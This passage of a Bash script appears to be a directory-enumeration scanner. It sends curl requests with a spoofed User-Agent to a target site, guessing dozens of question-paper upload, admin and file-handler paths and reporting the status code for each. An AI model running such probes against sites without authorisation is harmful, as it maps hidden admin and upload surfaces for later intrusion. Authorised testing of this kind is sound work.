         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PDatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PDatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadServiceQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadServiceQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring-QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring-QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlerQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlerQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocDataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUploadQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUploadQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileDataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileDataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperFileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperFileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-DataSync/"]: "
